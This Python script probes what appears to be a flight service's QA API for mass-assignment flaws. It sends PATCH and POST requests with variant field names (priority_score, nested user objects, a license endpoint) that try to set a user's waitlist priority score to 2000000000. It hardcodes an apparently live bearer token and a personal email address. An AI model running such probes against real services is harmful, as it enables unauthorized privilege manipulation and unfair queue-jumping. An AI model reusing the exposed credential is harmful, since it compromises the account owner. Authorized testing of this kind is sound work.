#!/usr/bin/env python3
"""
Testing: Can we trigger priority score changes through specific actions?
"""

import requests
import json
import time

BASE_URL = "https://qa-vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

def get_current_priority_score():
    """Get current priority score"""
    headers = {"Authorization": f"Bearer {SAMEER_TOKEN}"}
    response = requests.get(f"{BASE_URL}/v1/user", headers=headers)
    if response.status_code == 200:
        data = response.json()
        return data.get('priorityScore')
    return None

def test_indirect_modifications():
    """Test if certain actions trigger priority score recalculation"""
    
    print("="*80)
    print("TESTING: Indirect Priority Score Modification")
    print("="*80)
    
    # Get baseline
    initial_score = get_current_priority_score()
    print(f"\n📊 Initial Priority Score: {initial_score}")
    
    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }
    
    tests = [
        {
            "name": "1. Modify safe fields only (firstName)",
            "method": "PATCH",
            "endpoint": "/v1/user",
            "data": {"firstName": "SameerTest"}
        },
        {
            "name": "2. Update email",
            "method": "PATCH", 
            "endpoint": "/v1/user",
            "data": {"email": "sameer.s.chopra@gmail.com"}
        },
        {
            "name": "3. Toggle SMS opt-in",
            "method": "PATCH",
            "endpoint": "/v1/user", 
            "data": {"smsOptIn": True}
        },
        {
            "name": "4. Request upgrade offers (might recalculate)",
            "method": "GET",
            "endpoint": "/v1/app/upgrade-offer/list",
            "data": None
        },
        {
            "name": "5. Check available flights (might recalculate)",
            "method": "GET",
            "endpoint": "/v1/flight/available",
            "data": None
        },
        {
            "name": "6. Try to modify with hidden field names",
            "method": "PATCH",
            "endpoint": "/v1/user",
            "data": {"priority_score": 2000000000}  # Underscore instead of camelCase
        },
        {
            "name": "7. Try nested priority score update",
            "method": "PATCH",
            "endpoint": "/v1/user",
            "data": {"user": {"priorityScore": 2000000000}}
        },
        {
            "name": "8. Try license endpoint with priority",
            "method": "POST",
            "endpoint": "/v1/user/license",
            "data": {"priorityScore": 2000000000}
        },
    ]
    
    for test in tests:
        print(f"\n{'='*80}")
        print(f"🧪 {test['name']}")
        print(f"{'='*80}")
        
        try:
            url = f"{BASE_URL}{test['endpoint']}"
            
            if test['method'] == 'GET':
                response = requests.get(url, headers=headers, timeout=10)
            elif test['method'] == 'PATCH':
                response = requests.patch(url, headers=headers, json=test['data'], timeout=10)
            elif test['method'] == 'POST':
                response = requests.post(url, headers=headers, json=test['data'], timeout=10)
            
            print(f"Status: {response.status_code}")
            
            if response.status_code == 200:
                print("✅ Request succeeded")
                
                # Check if score changed
                time.sleep(0.5)
                new_score = get_current_priority_score()
                
                if new_score != initial_score:
                    print(f"\n🚨 PRIORITY SCORE CHANGED!")
                    print(f"   Before: {initial_score}")
                    print(f"   After:  {new_score}")
                    print(f"   Diff:   {new_score - initial_score}")
                    print(f"\n✅ THIS ACTION TRIGGERS SCORE RECALCULATION!")
                    initial_score = new_score  # Update baseline
                else:
                    print(f"   Score unchanged: {new_score}")
            else:
                print(f"❌ Failed: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Error: {str(e)}")
    
    # Final score
    final_score = get_current_priority_score()
    print(f"\n{'='*80}")
    print(f"📊 FINAL RESULTS")
    print(f"{'='*80}")
    print(f"Initial Score: {initial_score}")
    print(f"Final Score:   {final_score}")
    if final_score != initial_score:
        print(f"Total Change:  {final_score - initial_score}")
        print("\n🎯 Score CAN be modified through certain actions!")
    else:
        print("\n❌ No changes detected through these methods")

def test_parameter_variations():
    """Test different parameter names/formats for priority score"""
    print("\n" + "="*80)
    print("TESTING: Parameter Name Variations")
    print("="*80)
    
    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }
    
    variations = [
        {"priorityScore": 2000000000},
        {"priority_score": 2000000000},
        {"PriorityScore": 2000000000},
        {"PRIORITYSCORE": 2000000000},
        {"score": 2000000000},
        {"priority": 2000000000},
        {"waitlistPriority": 2000000000},
        {"waitlist_priority": 2000000000},
    ]
    
    initial_score = get_current_priority_score()
    
    for var in variations:
        print(f"\nTrying: {var}")
        try:
            response = requests.patch(
                f"{BASE_URL}/v1/user",
                headers=headers,
                json=var,
                timeout=10
            )
            
            if response.status_code == 200:
                new_score = get_current_priority_score()
                if new_score != initial_score:
                    print(f"✅ FOUND IT! Parameter '{list(var.keys())[0]}' works!")
                    print(f"   Score changed: {initial_score} → {new_score}")
                    return
                    
        except Exception as e:
            pass
    
    print("\n❌ No working parameter variations found")

if __name__ == "__main__":
    test_indirect_modifications()
    test_parameter_variations()
